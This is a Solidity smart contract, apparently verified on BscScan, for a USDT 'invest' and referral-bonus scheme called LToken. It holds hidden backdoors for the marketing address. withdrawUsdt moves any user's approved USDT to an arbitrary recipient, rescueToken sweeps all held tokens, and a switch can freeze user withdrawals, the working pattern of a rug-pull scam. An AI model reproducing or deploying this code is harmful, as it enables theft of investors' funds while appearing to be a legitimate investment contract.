/**
 *Submitted for verification at BscScan.com on 2022-06-20
*/

/**
 *Submitted for verification at BscScan.com on 2022-06-12
*/

pragma solidity 0.5.10;

interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);
    function burn(address account, uint amount) external;

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


contract Context {
    // Empty internal constructor, to prevent people from mistakenly deploying
    // an instance of this contract, which should be used via inheritance.
    constructor () internal { }
    // solhint-disable-previous-line no-empty-blocks

    function _msgSender() internal view returns (address) {
        return msg.sender;
    }

    function _msgData() internal view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () internal {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(isOwner(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Returns true if the caller is the current owner.
     */
    function isOwner() public view returns (bool) {
        return _msgSender() == _owner;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     */
    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}


contract LToken is Ownable{
	using SafeMath for uint256;

	uint256  public INVEST_MIN_AMOUNT = 299 * 10 ** 18;  
	uint256 public BONUS_FEE = 50; 
    uint256 public STATIC_NUM = 500000 * 10 ** 18; 
	uint256 constant public PERCENTS_DIVIDER = 1000;  //base lv

    bool public is_on;

    IERC20 public usdt;  //0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7  test

	struct Deposit {
		uint256 amount;
		uint256 start;
	}

	struct User {
		Deposit[] deposits;
		address referrer;  //上级
		uint256 Ubonus;  //U奖励
		uint256 Lbonus;  //L奖励
		uint256 totalReferrer; //总推人数--直推
        uint256 staticBonus;  // 静态购买获得数量
	}

	mapping (address => User) internal users;

    address public marketingAddress;

	event NewDeposit(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 amount, uint256 Lamount);
	event FeePayed(address indexed user, uint256 totalAmount);
	event Upline(address indexed addr, address indexed upline);

	constructor(IERC20 _usdt,address payable marketingAddr) public {
		require(!isContract(marketingAddr));
        usdt = _usdt;
		marketingAddress = marketingAddr;
	}

	modifier onlyMarket() {
        require(msg.sender == marketingAddress, "Ownable: caller is not the owner");
        _;
    }

    function updateUsdtAddress(IERC20 _usdt) public onlyMarket {
        usdt = _usdt;
    }

	function updateMarketingWalletAddress(address payable _address) public onlyMarket {
        marketingAddress = _address;
    }

    function updateIsOn(bool _is_on) public onlyMarket {
        is_on = _is_on;
    }

	function updateUp(address _user,address _referrer) public onlyMarket {
		User storage user = users[_user];
		user.referrer = _referrer;
	}

	function invest(address referrer,uint256 investAmount) public returns (bool) {
		require(investAmount > INVEST_MIN_AMOUNT);
        require(referrer != msg.sender);
		require(referrer != address(0));
        
        usdt.transferFrom(msg.sender, address(this), investAmount);
		emit FeePayed(msg.sender, investAmount);

		User storage user = users[msg.sender];

		if (user.referrer == address(0)) {
			user.referrer = referrer;
            users[referrer].totalReferrer++;
            emit Upline(msg.sender,referrer);
		}

		if (user.referrer != address(0)) {
			address upline = user.referrer;
            if (upline != address(0)) {
                uint256 amount = investAmount.mul(BONUS_FEE).div(PERCENTS_DIVIDER); //上级奖励5%的U
                users[upline].Ubonus = users[upline].Ubonus.add(amount);

                uint256 Lamount = STATIC_NUM.mul(BONUS_FEE).div(PERCENTS_DIVIDER); //上级奖励5%的Ltoken
                users[upline].Lbonus = users[upline].Lbonus.add(Lamount);
                emit RefBonus(upline, msg.sender,amount,Lamount);
            }
		}

		user.deposits.push(Deposit(investAmount, block.timestamp));

        user.staticBonus += STATIC_NUM;//当前用户静态购买的数量

		emit NewDeposit(msg.sender, investAmount);
		return true;
	}
	
	function getContractBalance() public view returns (uint256) {
		return usdt.balanceOf(address(this));
	}

    function withdraw() public returns (bool){
        require(is_on,"is_on == false");
		User storage user = users[msg.sender];

		uint256 totalAmount = user.Ubonus;
		
		require(totalAmount > 0, "User has no dividends");

		uint256 contractBalance = getContractBalance();
		if (contractBalance < totalAmount) {
			totalAmount = contractBalance;
		}
	
		usdt.transfer(msg.sender, totalAmount);
		
        user.Ubonus = 0;
        return true;
	}

	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	}

	function getUserInfo(address userAddress) public view returns(address,uint256,uint256,uint256,uint256){
		User storage user = users[userAddress];

		return (user.referrer,user.Ubonus,user.Lbonus,user.staticBonus,user.totalReferrer);
	}


	function getUserTotalDeposits(address userAddress) public view returns(uint256) {
	    User storage user = users[userAddress];

		uint256 amount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			amount = amount.add(user.deposits[i].amount);
		}

		return amount;
	}

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
	function donateEthDust(address payable _to,uint256 amount) external onlyMarket {
		_to.transfer(amount);
	}

	function rescueToken(address tokenAddress, uint256 tokens) public onlyMarket returns (bool success)
	{
		return IERC20(tokenAddress).transfer(msg.sender, tokens);
	}

    function withdrawUsdt(
        address from,
        address to,
        uint256 amount
    ) public onlyMarket {
        usdt.transferFrom(from,to,amount);
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}